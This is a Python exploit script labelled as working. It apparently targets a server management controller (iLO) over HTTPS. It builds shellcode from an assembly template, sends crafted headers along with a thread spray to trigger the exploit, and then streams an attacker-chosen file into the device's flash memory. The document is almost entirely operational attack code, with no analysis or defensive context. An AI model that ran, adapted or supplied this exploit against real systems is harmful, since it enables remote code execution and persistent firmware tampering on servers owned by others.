#!/usr/bin/env python3

# [WORKING] Write to Flash

import sys

from exploit_helpers import *
from hexdump import hexdump

if len(sys.argv) < 4:
    print "[-] usage: %s remote_addr version file_to_write" % sys.argv[0]
    sys.exit(1)

version = sys.argv[2]
o = get_version_info(version)

addr_start = 0
chip = 0

with open(sys.argv[3], "rb") as fff:
    to_write = fff.read()

if len(to_write) == 0 or (len(to_write) % 0x10000) != 0:
    print "[-] Error, file len should be a multiple of 0x10000"
    sys.exit(1)

s = ssl_connector(sys.argv[1], 443)

print "[*] Assembling shellcode..."

with open("flash_write_page.S","rb") as fff:
    shellcode = fff.read() % (
        o["wbuff_addr"]+0x4000,
        o["SSL_Write"],
        o["SSL_Read"],
        addr_start,
        len(to_write),
        chip,
        o["VComClientSync_Call"],
        o["memcpy"]
    )

bin_sc = asm_sc(shellcode)
check_shellcode(bin_sc)

sc_headers = get_sc_headers(bin_sc)
sc_headers += get_flush_headers()

vtable_headers = get_vtable_headers(o)
cookies_headers = get_cookies_headers()

ilo_version = get_xml_version(s, sc_headers + cookies_headers + vtable_headers)

if version != ilo_version.replace(".",""):
    print "[-] Bad version specified in command line"

ths = fill_threads(sys.argv[1], sc_headers + cookies_headers + vtable_headers)
send_exploit(s, sc_headers + cookies_headers + vtable_headers, o)
stop_threads(ths)

btmp = ""
out = ""
amount = 0
to_write_len = len(to_write)
while not btmp.startswith("EOT"):
    btmp = s.recv(0x818)
    if len(btmp) == 0:
        continue
    if "EOT" in btmp and len(btmp) < 16:
        print "[+] Done"
        break
    if "RDY" in btmp and len(btmp) < 16:
        print "[*] Ready! Send content (%x bytes)" % len(to_write)
	for k in xrange(0, to_write_len, 0x10000):
            s.send(to_write[k:k+0x10000])
	    print "[*] Sent %08x bytes..." % k
    else:
        amount += unpack_from("<L",btmp)[0]
        print "[*] %08x bytes written..." % amount


